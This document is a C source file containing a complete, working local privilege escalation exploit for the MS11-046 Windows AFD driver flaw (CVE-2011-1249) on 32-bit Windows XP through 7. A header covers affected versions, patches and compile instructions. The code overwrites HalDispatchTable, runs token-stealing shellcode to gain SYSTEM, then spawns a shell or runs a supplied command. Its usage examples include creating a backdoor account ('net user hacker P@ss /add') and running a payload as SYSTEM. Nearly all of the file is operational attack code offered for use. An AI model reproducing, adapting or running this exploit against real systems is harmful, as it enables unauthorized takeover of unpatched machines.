/*
################################################################
# Exploit Title: Windows x86 (all versions) AFD privilege escalation (MS11-046)
# Date: 2016-10-16
# Original Author: Tomislav Paskalev
# Modified by: appl3b0y
# Modification date: 2026
# Changes:
#   - Fixed MinGW cross-compilation error: FARPROC declaration of
#     ZwQuerySystemInformation caused "too many arguments; expected 0,
#     have 4" on i686-w64-mingw32-gcc. Replaced with typed function
#     pointer (pZwQuerySystemInformation) at file scope.
#   - Fixed dangling pointer: securityPatches arrays inside if/else
#     blocks were stack-allocated. Added static storage duration so
#     securityPatchesPtr remains valid when dereferenced later.
#   - Added custom command support via argv[1]:
#       MS11-046.exe                              (default: spawns cmd.exe)
#       MS11-046.exe "net user hacker P@ss /add"
#       MS11-046.exe "c:\shell.exe"
#   - Moved pZwQuerySystemInformation typedef to file scope
# Vulnerable Software:
#   Windows XP SP3 x86
#   Windows XP Pro SP2 x64
#   Windows Server 2003 SP2 x86
#   Windows Server 2003 SP2 x64
#   Windows Server 2003 SP2 Itanium-based Systems
#   Windows Vista SP1 x86
#   Windows Vista SP2 x86
#   Windows Vista SP1 x64
#   Windows Vista SP2 x64
#   Windows Server 2008 x86
#   Windows Server 2008 SP2 x86
#   Windows Server 2008 x64
#   Windows Server 2008 SP2 x64
#   Windows Server 2008 Itanium-based Systems
#   Windows Server 2008 SP2 Itanium-based Systems
#   Windows 7 x86
#   Windows 7 SP1 x86
#   Windows 7 x64
#   Windows 7 SP1 x64
#   Windows Server 2008 R2 x64
#   Windows Server 2008 R2 SP1 x64
#   Windows Server 2008 R2 Itanium-based Systems
#   Windows Server 2008 R2 SP1 Itanium-based Systems
# Supported Vulnerable Software:
#   Windows XP SP3 x86
#   Windows Server 2003 SP2 x86
#   Windows Vista SP1 x86
#   Windows Vista SP2 x86
#   Windows Server 2008 x86
#   Windows Server 2008 SP2 x86
#   Windows 7 x86
#   Windows 7 SP1 x86
# Tested Software:
#   Windows XP Pro SP3 x86 EN          [5.1.2600]
#   Windows Server 2003 Ent SP2 EN     [5.2.3790]
#   Windows Vista Ult SP1 x86 EN       [6.0.6001]
#   Windows Vista Ult SP2 x86 EN       [6.0.6002]
#   Windows Server 2008 Dat SP1 x86 EN [6.0.6001]
#   Windows Server 2008 Ent SP2 x86 EN [6.0.6002]
#   Windows 7 HB x86 EN                [6.1.7600]
#   Windows 7 Ent SP1 x86 EN           [6.1.7601]
# CVE ID: 2011-1249
################################################################
# Vulnerability description:
#   The Ancillary Function Driver (AFD) supports Windows sockets
#   applications and is contained in the afd.sys file. The afd.sys
#   driver runs in kernel mode and manages the Winsock TCP/IP
#   communications protocol.
#   An elevation of privilege vulnerability exists where the AFD
#   improperly validates input passed from user mode to the kernel.
#   An attacker must have valid logon credentials and be able to
#   log on locally to exploit the vulnerability.
#   An attacker who successfully exploited this vulnerability could
#   run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM
#   privileges).
################################################################
# Exploit notes:
#   Privileged shell execution:
#     - the SYSTEM shell will spawn within the invoking shell/process
#   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
#     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
#   Usage:
#     - MS11-046.exe                             (spawns cmd.exe as SYSTEM)
#     - MS11-046.exe "net user hacker P@ss /add" (custom command as SYSTEM)
#     - MS11-046.exe "c:\path\to\payload.exe"    (custom payload as SYSTEM)
#   Exploit prerequisites:
#     - low privilege access to the target OS
#     - target OS not patched (KB2503665, or any other related
#       patch, if applicable, not installed)
#   Exploit test notes:
#     - let the target OS boot properly (if applicable)
#     - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset
################################################################
# Patches:
#   Windows XP SP3 x86
#     WindowsXP-KB2503665-x86-enu.exe
#       (not available - EoL)
#   Windows Server 2003 SP2 x86
#     WindowsServer2003-KB2503665-x86-enu.exe
#       https://www.microsoft.com/en-us/download/details.aspx?id=26483
#   Windows Vista SP1, SP2 x86; Windows Server 2008 (SP1), SP2 x86
#     Windows6.0-KB2503665-x86.msu
#       https://www.microsoft.com/en-us/download/details.aspx?id=26275
#   Windows 7 (SP0), SP1 x86
#     Windows6.1-KB2503665-x86.msu
#       https://www.microsoft.com/en-us/download/details.aspx?id=26311
################################################################
# Related security vulnerabilities/patches:
#   MS11-046  KB2503665  https://technet.microsoft.com/en-us/library/security/ms11-046.aspx
#   MS11-080  KB2592799  https://technet.microsoft.com/en-us/library/security/ms11-080.aspx
#   MS12-009  KB2645640  https://technet.microsoft.com/en-us/library/security/ms12-009.aspx
#   MS13-093  KB2875783  https://technet.microsoft.com/en-us/library/security/ms13-093.aspx
#   MS14-040  KB2975684  https://technet.microsoft.com/en-us/library/security/ms14-040.aspx
#
#   Table of patch replacements:
#                               | MS11-046  | MS11-080  | MS12-009  | MS13-093  | MS14-040  |
#                               -------------------------------------------------------------
#                               | KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 |
#   -----------------------------------------------------------------------------------------
#   Windows x86 XP SP3          | Installed | <-Replaces|     -     |     -     |     -     |
#   Windows x86 Server 2003 SP2 | Installed | <-Replaces| <-Replaces|     -     | <-Replaces|
#   Windows x86 Vista SP1       | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 Vista SP2       | Installed |     -     |     -     |     -     | <-Replaces|
#   Windows x86 Server 2008     | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 Server 2008 SP2 | Installed |     -     |     -     |     -     | <-Replaces|
#   Windows x86 7               | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 7 SP1           | Installed |     -     |     -     |     -     | <-Replaces|
################################################################
# Thanks to:
#   azy (XP, 2k3 exploit)
#   Rahul Sasi (PoC)
################################################################
# References:
#   https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-1249
#   https://technet.microsoft.com/en-us/library/security/ms11-046.aspx
#   http://web.qhwins.com/Security/2012021712023641874126.html
#   https://www.exploit-db.com/exploits/18755/
################################################################
*/


#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>

#pragma comment (lib, "ws2_32.lib")


////////////////////////////////////////////////////////////////
// DEFINE DATA TYPES
////////////////////////////////////////////////////////////////

typedef enum _KPROFILE_SOURCE {
    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;


typedef DWORD (WINAPI *PNTQUERYINTERVAL) (
    KPROFILE_SOURCE   ProfileSource,
    PULONG            Interval
);


typedef LONG NTSTATUS;


typedef NTSTATUS (WINAPI *PNTALLOCATE) (
    HANDLE            ProcessHandle,
    PVOID             *BaseAddress,
    ULONG             ZeroBits,
    PULONG            RegionSize,
    ULONG             AllocationType,
    ULONG             Protect
);


typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS      Status;
        PVOID         Pointer;
    };
    ULONG_PTR         Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;


typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG             Reserved[2];
    PVOID             Base;
    ULONG             Size;
    ULONG             Flags;
    USHORT            Index;
    USHORT            Unknown;
    USHORT            LoadCount;
    USHORT            ModuleNameOffset;
    CHAR              ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);


// moved from inside main() — MinGW fix: FARPROC caused "expected 0, have 4"
typedef NTSTATUS (WINAPI *pZwQuerySystemInformation) (
    ULONG             SystemInformationClass,
    PVOID             SystemInformation,
    ULONG             SystemInformationLength,
    PULONG            ReturnLength
);


////////////////////////////////////////////////////////////////
// FUNCTIONS
////////////////////////////////////////////////////////////////

BOOL IsWow64()
{
    BOOL bIsWow64 = FALSE;
    LPFN_ISWOW64PROCESS fnIsWow64Process;

    fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if(NULL != fnIsWow64Process)
    {
        if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
        {
            printf("   [-] Failed (error code: %d)\n", GetLastError());
            return -1;
        }
    }
    return bIsWow64;
}


////////////////////////////////////////////////////////////////
// MAIN FUNCTION
////////////////////////////////////////////////////////////////

int main(int argc, char *argv[])
{
    // custom command: default is cmd.exe, override with argv[1]
    const char *spawnCmd = "c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32";
    if (argc > 1)
        spawnCmd = argv[1];

    printf("[*] MS11-046 (CVE-2011-1249) x86 exploit\n");
    printf("   [*] by Tomislav Paskalev | modified by appl3b0y\n");


    ////////////////////////////////////////////////////////////////
    // IDENTIFY TARGET OS ARCHITECTURE AND VERSION
    ////////////////////////////////////////////////////////////////

    printf("[*] Identifying OS\n");

    if(IsWow64())
    {
        printf("   [-] 64-bit\n");
        return -1;
    }

    printf("   [+] 32-bit\n");

    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO) &osvi);

    unsigned char shellcode_KPROCESS;
    unsigned char shellcode_TOKEN;
    unsigned char shellcode_UPID;
    unsigned char shellcode_APLINKS;
    const char **securityPatchesPtr;
    int securityPatchesCount;
    int lpInBufferSize;

    if((osvi.dwMajorVersion == 5) && (osvi.dwMinorVersion == 1) && (osvi.wServicePackMajor == 3))
    {
        printf("   [+] Windows XP SP3\n");
        shellcode_KPROCESS = '\x44';
        shellcode_TOKEN    = '\xC8';
        shellcode_UPID     = '\x84';
        shellcode_APLINKS  = '\x88';
        static const char *securityPatches[] = {"KB2503665", "KB2592799"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 2;
        lpInBufferSize = 0x30;
    }

    else if((osvi.dwMajorVersion == 5) && (osvi.dwMinorVersion == 2) && (osvi.wServicePackMajor == 2) && (GetSystemMetrics(89) == 0))
    {
        printf("   [+] Windows Server 2003 SP2\n");
        shellcode_KPROCESS = '\x38';
        shellcode_TOKEN    = '\xD8';
        shellcode_UPID     = '\x94';
        shellcode_APLINKS  = '\x98';
        static const char *securityPatches[] = {"KB2503665", "KB2592799", "KB2645640", "KB2975684"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 4;
        lpInBufferSize = 0x30;
    }

    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 0) && (osvi.wServicePackMajor == 1) && (osvi.wProductType == 1))
    {
        printf("   [+] Windows Vista SP1\n");
        shellcode_KPROCESS = '\x48';
        shellcode_TOKEN    = '\xE0';
        shellcode_UPID     = '\x9C';
        shellcode_APLINKS  = '\xA0';
        static const char *securityPatches[] = {"KB2503665"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 1;
        lpInBufferSize = 0x30;
    }

    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 0) && (osvi.wServicePackMajor == 2) && (osvi.wProductType == 1))
    {
        printf("   [+] Windows Vista SP2\n");
        shellcode_KPROCESS = '\x48';
        shellcode_TOKEN    = '\xE0';
        shellcode_UPID     = '\x9C';
        shellcode_APLINKS  = '\xA0';
        static const char *securityPatches[] = {"KB2503665", "KB2975684"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 2;
        lpInBufferSize = 0x10;
    }

    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 0) && (osvi.wServicePackMajor == 1) && (osvi.wProductType != 1))
    {
        printf("   [+] Windows Server 2008\n");
        shellcode_KPROCESS = '\x48';
        shellcode_TOKEN    = '\xE0';
        shellcode_UPID     = '\x9C';
        shellcode_APLINKS  = '\xA0';
        static const char *securityPatches[] = {"KB2503665"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 1;
        lpInBufferSize = 0x10;
    }

    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 0) && (osvi.wServicePackMajor == 2) && (osvi.wProductType != 1))
    {
        printf("   [+] Windows Server 2008 SP2\n");
        shellcode_KPROCESS = '\x48';
        shellcode_TOKEN    = '\xE0';
        shellcode_UPID     = '\x9C';
        shellcode_APLINKS  = '\xA0';
        static const char *securityPatches[] = {"KB2503665", "KB2975684"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 2;
        lpInBufferSize = 0x08;
    }

    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 1) && (osvi.wServicePackMajor == 0))
    {
        printf("   [+] Windows 7\n");
        shellcode_KPROCESS = '\x50';
        shellcode_TOKEN    = '\xF8';
        shellcode_UPID     = '\xB4';
        shellcode_APLINKS  = '\xB8';
        static const char *securityPatches[] = {"KB2503665"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 1;
        lpInBufferSize = 0x20;
    }

    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 1) && (osvi.wServicePackMajor == 1))
    {
        printf("   [+] Windows 7 SP1\n");
        shellcode_KPROCESS = '\x50';
        shellcode_TOKEN    = '\xF8';
        shellcode_UPID     = '\xB4';
        shellcode_APLINKS  = '\xB8';
        static const char *securityPatches[] = {"KB2503665", "KB2975684"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 2;
        lpInBufferSize = 0x10;
    }

    else
    {
        printf("   [-] Unsupported version\n");
        printf("      [*] Affected 32-bit operating systems\n");
        printf("         [*] Windows XP SP3\n");
        printf("         [*] Windows Server 2003 SP2\n");
        printf("         [*] Windows Vista SP1\n");
        printf("         [*] Windows Vista SP2\n");
        printf("         [*] Windows Server 2008\n");
        printf("         [*] Windows Server 2008 SP2\n");
        printf("         [*] Windows 7\n");
        printf("         [*] Windows 7 SP1\n");
        return -1;
    }


    ////////////////////////////////////////////////////////////////
    // LOCATE REQUIRED OS COMPONENTS
    ////////////////////////////////////////////////////////////////

    printf("[*] Locating required OS components\n");

    pZwQuerySystemInformation ZwQuerySystemInformation;
    ZwQuerySystemInformation = (pZwQuerySystemInformation) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwQuerySystemInformation");

    ULONG systemInformation;
    ZwQuerySystemInformation(11, (PVOID) &systemInformation, 0, &systemInformation);

    ULONG *systemInformationBuffer;
    systemInformationBuffer = (ULONG *) malloc(systemInformation * sizeof(*systemInformationBuffer));

    if(!systemInformationBuffer)
    {
        printf("   [-] Could not allocate memory");
        return -1;
    }

    ZwQuerySystemInformation(11, systemInformationBuffer, systemInformation * sizeof(*systemInformationBuffer), NULL);

    ULONG i;
    PVOID targetKrnlMdlBaseAddr;
    HMODULE targetKrnlMdlUsrSpcOffs;
    BOOL foundModule = FALSE;
    PSYSTEM_MODULE_INFORMATION loadedMdlStructPtr;
    loadedMdlStructPtr = (PSYSTEM_MODULE_INFORMATION) (systemInformationBuffer + 1);

    for(i = 0; i < *systemInformationBuffer; i++)
    {
        if(strstr(loadedMdlStructPtr[i].ImageName, "ntkrnlpa.exe"))
        {
            printf("   [+] ntkrnlpa.exe\n");
            targetKrnlMdlUsrSpcOffs = LoadLibraryExA("ntkrnlpa.exe", 0, 1);
            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;
            foundModule = TRUE;
            break;
        }
        else if(strstr(loadedMdlStructPtr[i].ImageName, "ntoskrnl.exe"))
        {
            printf("   [+] ntoskrnl.exe\n");
            targetKrnlMdlUsrSpcOffs = LoadLibraryExA("ntoskrnl.exe", 0, 1);
            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;
            foundModule = TRUE;
            break;
        }
    }

    printf("      [*] Address:      %#010x\n", targetKrnlMdlBaseAddr);
    printf("      [*] Offset:       %#010x\n", targetKrnlMdlUsrSpcOffs);

    if(!foundModule)
    {
        printf("   [-] Could not find ntkrnlpa.exe/ntoskrnl.exe\n");
        return -1;
    }

    free(systemInformationBuffer);

    ULONG_PTR HalDispatchTableUsrSpcOffs;
    HalDispatchTableUsrSpcOffs = (ULONG_PTR) GetProcAddress(targetKrnlMdlUsrSpcOffs, "HalDispatchTable");

    if(!HalDispatchTableUsrSpcOffs)
    {
        printf("      [-] Could not find HalDispatchTable\n");
        return -1;
    }

    printf("      [+] HalDispatchTable\n");
    printf("         [*] Offset:    %#010x\n", HalDispatchTableUsrSpcOffs);

    ULONG_PTR HalDispatchTableKrnlSpcAddr;
    HalDispatchTableKrnlSpcAddr = HalDispatchTableUsrSpcOffs - (ULONG_PTR) targetKrnlMdlUsrSpcOffs;
    HalDispatchTableKrnlSpcAddr += (ULONG_PTR) targetKrnlMdlBaseAddr;

    PNTQUERYINTERVAL NtQueryIntervalProfile;
    NtQueryIntervalProfile = (PNTQUERYINTERVAL) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");

    if(!NtQueryIntervalProfile)
    {
        printf("   [-] Could not find NtQueryIntervalProfile\n");
        return -1;
    }

    printf("   [+] NtQueryIntervalProfile\n");
    printf("      [*] Address:      %#010x\n", NtQueryIntervalProfile);

    FARPROC ZwDeviceIoControlFile;
    ZwDeviceIoControlFile = GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwDeviceIoControlFile");

    if(!ZwDeviceIoControlFile)
    {
        printf("   [-] Could not find ZwDeviceIoControlFile\n");
        return -1;
    }

    printf("   [+] ZwDeviceIoControlFile\n");
    printf("      [*] Address:      %#010x\n", ZwDeviceIoControlFile);


    ////////////////////////////////////////////////////////////////
    // SETUP EXPLOITATION PREREQUISITE
    ////////////////////////////////////////////////////////////////

    printf("[*] Setting up exploitation prerequisite\n");

    printf ("   [*] Initialising Winsock DLL\n");
    WORD wVersionRequested;
    WSADATA wsaData;
    int wsaStartupErrorCode;

    wVersionRequested = MAKEWORD(2, 2);
    wsaStartupErrorCode = WSAStartup(wVersionRequested, &wsaData);

    if(wsaStartupErrorCode != 0)
    {
        printf("      [-] Failed (error code: %d)\n", wsaStartupErrorCode);
        return -1;
    }

    printf("      [+] Done\n");

    printf("      [*] Creating socket\n");
    SOCKET targetDeviceSocket = INVALID_SOCKET;
    targetDeviceSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    if(targetDeviceSocket == INVALID_SOCKET)
    {
        printf("         [-] Failed (error code: %ld)\n", WSAGetLastError());
        return -1;
    }

    printf("         [+] Done\n");

    struct sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("127.0.0.1");
    clientService.sin_port = htons(0);

    printf("         [*] Connecting to closed port\n");
    int connectResult;
    connectResult = connect(targetDeviceSocket, (SOCKADDR *) &clientService, sizeof(clientService));
    if (connectResult == 0)
    {
        printf ("            [-] Connected (error code: %ld)\n", WSAGetLastError());
        return -1;
    }

    printf("            [+] Done\n");


    ////////////////////////////////////////////////////////////////
    // CREATE TOKEN STEALING SHELLCODE
    ////////////////////////////////////////////////////////////////

    printf("[*] Creating token stealing shellcode\n");

    unsigned char shellcode[] =
    {
        0x52,
        0x53,
        0x33,0xC0,
        0x64,0x8B,0x80,0x24,0x01,0x00,0x00,
        0x8B,0x40,shellcode_KPROCESS,
        0x8B,0xC8,
        0x8B,0x98,shellcode_TOKEN,0x00,0x00,0x00,
        0x8B,0x80,shellcode_APLINKS,0x00,0x00,0x00,
        0x81,0xE8,shellcode_APLINKS,0x00,0x00,0x00,
        0x81,0xB8,shellcode_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,
        0x75,0xE8,
        0x8B,0x90,shellcode_TOKEN,0x00,0x00,0x00,
        0x8B,0xC1,
        0x89,0x90,shellcode_TOKEN,0x00,0x00,0x00,
        0x5B,
        0x5A,
        0xC2,0x08
    };

    printf("   [*] Shellcode assembled\n");

    printf("   [*] Allocating memory\n");
    LPVOID shellcodeAddress;
    shellcodeAddress = VirtualAlloc((PVOID) 0x02070000, 0x20000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    int errorCode = 0;

    if(shellcodeAddress == NULL)
    {
        errorCode = GetLastError();
        if(errorCode == 487)
        {
            printf("      [!] Could not reserve entire range\n");
            printf("         [*] Rerun exploit\n");
        }
        else
            printf("      [-] Failed (error code: %d)\n", errorCode);
        return -1;
    }

    printf("      [+] Address:      %#010x\n", shellcodeAddress);

    memset(shellcodeAddress, 0x90, 0x20000);
    memcpy((shellcodeAddress + 0x10000), shellcode, sizeof(shellcode));
    printf("      [*] Shellcode copied\n");


    ////////////////////////////////////////////////////////////////
    // EXPLOIT THE VULNERABILITY
    ////////////////////////////////////////////////////////////////

    printf("[*] Exploiting vulnerability\n");

    printf("   [*] Sending AFD socket connect request\n");
    DWORD lpInBuffer[lpInBufferSize];
    memset(lpInBuffer, 0, (lpInBufferSize * sizeof(DWORD)));

    lpInBuffer[3] = 0x01;
    lpInBuffer[4] = 0x20;
    ULONG lpBytesReturned = 0;

    if(DeviceIoControl(
        (HANDLE) targetDeviceSocket,
        0x00012007,
        (PVOID) lpInBuffer, sizeof(lpInBuffer),
        (PVOID) (HalDispatchTableKrnlSpcAddr + 0x6), 0x0,
        &lpBytesReturned, NULL
        ) == 0)
    {
        errorCode = GetLastError();
        if(errorCode == 1214)
        {
            printf("      [+] Done\n");
        }
        else if(errorCode == 998)
        {
            printf("      [!] Target patched\n");
            printf("         [*] Possible security patches\n");
            for(i = 0; i < securityPatchesCount; i++)
                printf("            [*] %s\n", securityPatchesPtr[i]);
            return -1;
        }
        else
        {
            printf("      [-] Failed (error code: %d)\n", errorCode);
            return -1;
        }
    }

    printf("      [*] Elevating privileges to SYSTEM\n");
    ULONG outInterval = 0;
    NtQueryIntervalProfile(2, &outInterval);
    printf("         [+] Done\n");

    printf("         [*] Spawning shell\n");
    system(spawnCmd);

    printf("\n[*] Exiting SYSTEM shell\n");
    WSACleanup();
    return 1;
}

// EoF
